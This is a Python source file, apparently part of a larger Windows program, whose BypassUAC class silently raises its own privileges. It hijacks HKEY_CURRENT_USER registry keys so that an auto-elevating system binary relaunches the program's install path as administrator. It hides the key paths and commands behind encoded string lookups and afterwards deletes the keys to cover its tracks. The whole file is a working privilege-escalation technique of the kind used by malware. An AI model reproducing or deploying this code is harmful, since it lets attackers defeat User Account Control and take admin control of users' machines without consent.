# -*- coding: utf8 -*-
from __future__ import print_function
import os
import sys
import ctypes
import winreg
import StringEncode,ComMod
from time import sleep
from platform import win32_ver

FHP = StringEncode.get("8")
GERP = StringEncode.get("9")
DERK = StringEncode.get("10")
DMCP = StringEncode.get("11")

class BypassUAC():
    def __init__(self,install_path):
        self.install_path = install_path
        if not self.is_admin():
            ComMod.Log("UAC：{}".format('检测到不是管理员'))
            self.admin = False
            if win32_ver()[0] == '10':
                ComMod.Log("UAC：{}".format('检测到是Windows 10'))
                self.win10()
            else:
                ComMod.Log("UAC：{}".format('检测到非Windows 10'))
                self.other()
        else:
            self.clean()
            self.admin = True
    def other(self):
        ComMod.Log("UAC：{}".format('Other UAC 开始'))
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software', 0, winreg.KEY_ALL_ACCESS)
            key = winreg.CreateKey(key, StringEncode.get("5"))

            winreg.SetValueEx(key, '', '', winreg.REG_SZ, StringEncode.get('6') + self.install_path + StringEncode.get('4'))
            sleep(3)
            os.system(StringEncode.get("7"))
            sleep(3)
            winreg.DeleteKey(key, '')
            winreg.CloseKey(key)
            ComMod.Log("UAC：{}".format('Other UAC 完毕重启'))
            sys.exit(0)
        except Exception as e:
            print(e)
            ComMod.Log("UAC：{}".format('Other UAC 异常退出'))
            sys.exit(1)
    def win10(self):
        ComMod.Log("UAC：{}".format('Windows 10 UAC 开始'))
        try:
            command = StringEncode.get('6') + self.install_path + StringEncode.get('4')
            self.bypass_uac(command)
            os.system(FHP)
            ComMod.Log("UAC：{}".format('Windows 10 UAC 完毕重启'))
            sys.exit(0)
        except WindowsError:
            ComMod.Log("UAC：{}".format('Windows 10 UAC 异常退出'))
            sys.exit(1)

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def create_reg_key(self,key, value):
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, GERP)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, GERP, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
        except WindowsError:
            raise

    def bypass_uac(self,cmd):
        try:
            self.create_reg_key(DERK, '')
            self.create_reg_key(None, cmd)
        except WindowsError:
            raise
    def clean(self):
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, StringEncode.get('13'), 0,
                                          winreg.KEY_ALL_ACCESS)
            winreg.DeleteKey(registry_key, StringEncode.get('14'))
            winreg.CloseKey(registry_key)
            ComMod.Log("UAC：{}".format('打扫战场完成'))
        except Exception as e:
            ComMod.Log("UAC：{}".format('打扫战场失败：'+str(e)))